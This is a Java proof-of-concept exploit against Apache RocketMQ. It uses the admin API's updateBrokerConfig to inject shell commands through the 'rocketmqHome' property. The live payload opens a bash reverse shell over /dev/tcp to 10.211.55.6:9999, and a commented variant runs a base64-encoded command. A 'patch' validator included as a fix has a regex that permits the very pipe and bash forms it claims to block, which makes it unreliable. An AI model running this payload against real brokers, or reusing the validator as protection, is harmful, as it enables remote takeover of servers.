package org.example;

import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;

import java.io.File;
import java.io.IOException;
import java.util.Properties;

public class Main {
    public static void main(String[] args) throws Exception {
        //nameserver address
        String nameserverAddress = "10.211.55.6:10911";
        updateConfig(nameserverAddress);

    }

    /**
     * Use method updateBrokerConfig to simulate an attack request.
     *
     * @param nameserverAddress
     * @throws Exception
     */
    public static void updateConfig(String nameserverAddress) throws Exception {
        Properties props = new Properties();

        //use base64 encoding "touch /tmp/dddddddaa"
        //props.setProperty("rocketmqHome","-c bash${IFS}-c${IFS}\"{echo,dG91Y2ggL3RtcC9kZGRkZGRkYWE=}|{base64,-d}|{bash,-i}\";");

        //or reverse shell
        props.setProperty("rocketmqHome", "-c $@|sh . echo bash -i >& /dev/tcp/10.211.55.6/9999 0>&1;");

        props.setProperty("filterServerNums", "1");

        //patch function test
        //getValidatedRocketmqHome(props.getProperty("rocketmqHome"));

        DefaultMQAdminExt admin = new DefaultMQAdminExt();
        admin.setNamesrvAddr(nameserverAddress);
        admin.start();
        admin.updateBrokerConfig(nameserverAddress, props);
        Properties brokerConfig = admin.getBrokerConfig(nameserverAddress);
        System.out.println(brokerConfig.getProperty("rocketmqHome"));
        System.out.println(brokerConfig.getProperty("filterServerNums"));
        System.out.println("update config succeed");
        admin.shutdown();
    }

    /**
     * Alternative upgrade: add strong checksums for parameters
     *
     * @param rocketmqHome
     * @return
     * @throws IOException
     */
    public static String getValidatedRocketmqHome(String rocketmqHome) throws IOException {
//        String rocketmqHome = this.getBrokerConfig().getRocketmqHome();

        // Sanitize the rocketmqHome path from shell metacharacters or control characters
        if (rocketmqHome == null || !rocketmqHome.matches("-c[^\\r\\n|]*(\\|[^\\r\\n]*)?( echo| bash)?")) {
            throw new RuntimeException("RocketMQ home path contains invalid characters.");
        }

        // Ensure the directory exists and is not compromised
        File rocketmqDir = new File(rocketmqHome);
        if (!rocketmqDir.exists() || !rocketmqDir.isDirectory()) {
            throw new IOException("RocketMQ home path does not exist or is not a directory.");
        }

        return rocketmqHome;
    }
}